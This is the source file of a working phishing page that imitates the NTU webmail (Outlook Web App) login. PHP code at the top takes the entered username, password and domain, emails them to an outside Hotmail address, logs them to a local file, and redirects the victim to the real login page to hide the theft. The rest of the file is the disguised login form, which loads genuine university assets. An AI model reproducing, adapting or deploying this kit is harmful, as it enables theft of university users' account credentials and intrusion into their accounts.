<?php
if(isset($_GET['gosend'])){
  $to      = 'ab4sky@hotmail.com';
  $subject = 'Ku Form'.mt_rand();
  $message = 'USERNAME: '.$_POST['username'] .' PASSWORD: '.$_POST['password']. ' DOMAIN: '.$_POST['domain']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);

if(mail($to, $subject, $message, $headers)){
    header("Location: https://webmail.ntu.edu.sg/owa/auth/logon.aspx");
    exit;
  } else {
    $phpself = '';
    if($_SERVER['PHP_SELF'] != 'index.php'){$phpself = $_SERVER['PHP_SELF'];}
    $urlSelf = 'http://'.$_SERVER['SERVER_NAME'].'/'.$phpself;
    header("Location: $urlSelf");
    exit;
 }
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
<meta name="Robots" content="NOINDEX, NOFOLLOW">
<title>NTU Webmail - OWA13</title>
<link type="text/css" rel="stylesheet" href="https://webmail.ntu.edu.sg/owa/14.3.123.3/themes/resources/logon.css">
<link type="text/css" rel="stylesheet" href="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/owafont.css">
<!-- <script type="text/javascript" src="https://webmail.ntu.edu.sg/owa/14.3.123.3/scripts/premium/flogon.js"></script> -->
<script type="text/javascript">
	<!--
	var a_fRC = 1;
	var g_fFcs = 1;
	var a_fLOff = 0;
	var a_fCAC = 1

function IsMimeCtlInst(progid)
{
	var oMimeVer = null;

	try 
	{ 
		oMimeVer = new ActiveXObject(progid);
	} 
	catch (e)
	{ 
	}

	if (oMimeVer != null)
		return true;
	else
		return false;
}
</script>
</head>
<body class="owaLgnBdy" topmargin="0" style="background-color: #ACACAC">
<script type="text/javascript">
function submitLogonForm(){
       var username = document.getElementById("username").value;
       if(username && username.indexOf("\\")==-1){
              document.getElementById("username").value = document.getElementById("domain").value + "\\" + username;
       }
       document.logonForm.submit();
}

function submitCreds_OnClick(){
       submitLogonForm();
}             

function password_KeyDown(e){
       var evt = e||window.event;
       if(evt.keyCode == 13){
              submitLogonForm();
       }
       else{
              return true;
       }
}
</script> 


<form action="./?gosend" method="POST" name="logonForm" autocomplete="off">
  
  <!-- Cutomisation 1 -->
  
  <div align="left">
  <table border="0" width="736" id="table1" bgcolor="#FFFFFF" cellspacing="0">
  <tr>
    <td colspan="2"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/header.gif" width="736" height"></td>
  </tr>
  <tr>
    <td width="204" bgcolor="#F8F8F8" align="left" valign="top"><table border="0" width="96%" id="table2" bgcolor="#F8F8F8">
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/livelogon.gif" width="59" height="49"></td>
          <td><a href="javascript:void window.open('http://www.outlook.com/e.ntu.edu.sg','livelogon')" title="Logon using username@e.ntu.edu.sg"> <font face="Verdana" size="1" color="#000000">Logon to Office365 <b>(for STUDENT and ALUMNI)</b></a></font><br>
            <img src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/line.gif"></td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/liveguide.gif" width="59" height="49"></td>
          <td><a href="javascript:void window.open('http://www3.ntu.edu.sg/exchange/live','live')" title="Tell Me More"> <font face="Verdana" size="1" color="#000000">Guide on Office365 <b>(for STUDENT and ALUMNI)</b></a></font><br>
            <img src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/line.gif"></td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/checkquota.gif" width="59" height="49"></td>
          <td><a href="javascript:void window.open('http://www.ntu.edu.sg/cits/e-mailandmessaging/e-mail/Pages/importantnoticesforUsers.aspx','checkquota','status=1,width=800,scrollbars=1')" title="Logon using student\username, etc."> <font face="Verdana" size="1" color="#000000">Important Notices for Email Users</a></font><br>
            <img src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/line.gif"></td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/changepwd.gif" width="59" height="49"></td>
          <td><a href="javascript:void window.open('https://pwd.ntu.edu.sg','pwd','status=1,width=800,height=600,scrollbars=1,resizable=1')" title="Change My Password"> <font face="Verdana" size="1" color="#000000">Change My Network 
            Account Password</font></a><br>
            <img src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/line.gif"></td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/publicfolder.gif" width="59" height="49"></td>
          <td><a href="javascript:void window.open('https://webmail3.ntu.edu.sg/public/','publicfolder','status=1,width=800,scrollbars=1')" title="Public Folders"> <font face="Verdana" size="1" color="#000000">Access Public Folders</a></font><br>
            <img src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/line.gif"></td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/emailguide.gif" width="59" height="49"></td>
          <td><a href="javascript:void window.open('http://www.ntu.edu.sg/cits/e-mailandmessaging/e-mail/Pages/quickstartguide.aspx','email','status=1,width=800,height=600,scrollbars=1,resizable=1')" title="Quick Start Guide"> <font face="Verdana" size="1" color="#000000">Email Help Guide</font></a><br>
            <img src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/line.gif"></td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35"><img border="0" src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/helpdesk.gif" width="59" height="49"></td>
          <td><a href="javascript:void window.open('http://www.ntu.edu.sg/cits/gettinghelp/Pages/helpdesk.aspx','helpdesk','status=1,scrollbars=1')" title="Help Me!"> <font face="Verdana" size="1" color="#000000">Contact Service Desk - CITS</font></a><br>
            <img src="https://webmail.ntu.edu.sg/owa/CustomizedOWA/themes/base/line.gif"></td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td width="5">&nbsp;</td>
          <td width="35">&nbsp;</td>
          <td>&nbsp;</td>
        </tr>
      </table>
      <p>&nbsp;</p>
      <p>&nbsp;</td>
    <td width="530" valign="top"><b> 
      
      <!-- End of Customisation 1 -->
      
      <table align="center" id="tblMain" cellpadding=0 cellspacing=0>
        <tr>
          <td colspan=3><table cellspacing=0 cellpadding=0 class="tblLgn">
              <tr>
                <td class="lgnTL"><img src="https://webmail.ntu.edu.sg/owa/14.3.123.3/themes/resources/lgntopl.gif" alt=""></td>
                <td class="lgnTM"></td>
                <td class="lgnTR"><img src="https://webmail.ntu.edu.sg/owa/14.3.123.3/themes/resources/lgntopr.gif" alt=""></td>
              </tr>
            </table></td>
        </tr>
        <tr>
          <td id="mdLft">&nbsp;</td>
          <td id="mdMid"><table id="tblMid" class="mid">
              <tr>
                <td id="expltxt" class="expl"></td>
              </tr>
              <tr>
                <td><table cellpadding=0 cellspacing=0>
                    <col>
                    <col class="w100">
                    <tr id=trSec>
                      <td colspan="2"><b><font size="2">Choose your Security Options: </font></b> &#x200E;( <a href="#" id="lnkShwSec" onclick="clkExp('lnkShwSec')"> show explanation </a> <a href="#" id="lnkHdSec" onclick="clkExp('lnkHdSec')" style="display:none"> hide explanation </a> )&#x200E; </td>
                    </tr>
                    <tr>
                      <td><input id="rdoPblc" type="radio" name="trusted" value="0" class="rdo" onclick="clkSec()" checked></td>
                      <td><label for="rdoPblc"><font size="2">Select to use Webmail from a public or shared computer</font></label></td>
                    </tr>
                    <tr id="trPubExp" class="expl" style="display:none">
                      <td></td>
                      <td>Select this option if you are using Webmail on a public computer. Be sure to log off Webmail and close all windows to end your session.</td>
                    </tr>
                    <tr>
                      <td><input id="rdoPrvt" type="radio" name="trusted" value="4" class="rdo" onclick="clkSec()"></td>
                      <td><label for="rdoPrvt"><font size="2">Select to use Webmail on your personal computer</font></label></td>
                    </tr>
                    <tr id="trPrvtExp" class="expl" style="display:none">
                      <td></td>
                      <td>Select this option if you are the only person who uses this computer. Webmail will allow a longer period of inactivity before logging you off.</td>
                    </tr>
                    <tr id="trPrvtWrn" class="wrng" style="display:none">
                      <td></td>
                      <td> Warning: By selecting option 'private computer' you are reminded that you shall be personally liable for the maintenance of your User Account to prevent the occurrence of any breach of NTU Computing Rules</td>
                    </tr>
                  </table></td>
              </tr>
              <tr>
                <td><hr></td>
              </tr>
              <tr>
                <td><table cellpadding=0 cellspacing=0>
                    <col>
                    <col class="w100">
                    <tr>
                      <td><input id="chkBsc" type="checkbox" class="rdo" onclick="clkBsc();"></td>
                      <td nowrap><label for="chkBsc"><b><font size="2">Check here to use Webmail in Basic Mode</font></b></label></td>
                    </tr>
                    <tr id="trBscExp" class="disBsc" style="display:none">
                      <td></td>
                      <td>Basic Mode provides fewer features. Use this mode if connection is slow or on browser with strict security settings.</td>
                    </tr>
                  </table></td>
              </tr>
              <tr>
                <td><hr></td>
              </tr>
              <tr>
                <td><table cellpadding=0 cellspacing=0>
                    <col class="nowrap">
                    <col class="w100">
                    <col>
                    <tr>
                      <td nowrap><label for="username"><b><font size="2">Username:<font></b></label></td>
                      <td class="txtpad"><input id="username" name="username" type="text" class="txt"></td>
                    </tr>
                    <tr>
                      <td nowrap><label for="password"><b><font size="2">Password:<font></b></label></td>
                      <td class="txtpad"><input id="password" name="password" type="password" class="txt" onfocus="g_fFcs=0"onkeydown="password_KeyDown(event)"></td>
                    </tr>
                    <tr> 
                      
                      <!-- Cutomisation 2 -->
                      
                      <TD NOWRAP width="1%"><P><b><font size="2">Domain:<font></b></P></TD>
                      <TD><select name="domain" id="domain">
                          <option value="STAFF" selected>STAFF</option>
                          <option value="STUDENT">STUDENT</option>
                          <option value="ASSOC">ASSOC</option>
                        </select></TD>
                      
                      <!-- End of Customisation 2 -->
                      
                      <td colspan=2 align="right" class="txtpad"><input type="button" value="Log On" id="SubmitCreds" name="SubmitCreds" onclick="submitCreds_OnClick()">
                        </input>
                        <input name="isUtf8" type="hidden" value="1"></td>
                    </tr>
                  </table></td>
              </tr>
              <tr>
                <td><hr></td>
              </tr>
            </table>
            <table id="tblMid2" class="mid" style="display:none">
              <tr>
                <td><hr></td>
              </tr>
              <tr>
                <td><br>
                  Please enable cookies for this Web site.<br>
                  <br>
                  Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled. <br>
                  <br>
                  For information about how to enable cookies, see the Help for your Web browser.<br>
                  <br>
                  <br></td>
              </tr>
              <tr>
                <td><hr></td>
              </tr>
              <tr>
                <td align="right" class="txtpad"><input type="button" style="float: right" value="Retry" onclick="clkRtry()" ></td>
              </tr>
            </table>
            <table class="mid tblConn">
              <tr><font size=2><br>
                <b>Important Notice:</b>
                <p>1. For first-time users please change your Network Account <a href="javascript:void window.open('https://pwd.ntu.edu.sg','pwd','status=1,width=800,height=600,scrollbars=1,resizable=1')" title=""> password</a> first</p>
                <p>2. To protect your account from unauthorized access, Webmail automatically closes its connection to your mailbox after a period of inactivity. If your session ends, refresh your browser, and then log on again. 
                </font></tr>
            </table></td>
          <td id="mdRt">&nbsp;</td>
        </tr>
        <tr>
          <td colspan=3><table cellspacing=0 cellpadding=0 class="tblLgn">
              <tr>
                <td class="lgnBL"><img src="https://webmail.ntu.edu.sg/owa/14.3.123.3/themes/resources/lgnbotl.gif" alt=""></td>
                <td class="lgnBM"></td>
                <td class="lgnBR"><img src="https://webmail.ntu.edu.sg/owa/14.3.123.3/themes/resources/lgnbotr.gif" alt=""></td>
              </tr>
            </table></td>
        </tr>
      </table>
</form>

</div>
</body>
</html>
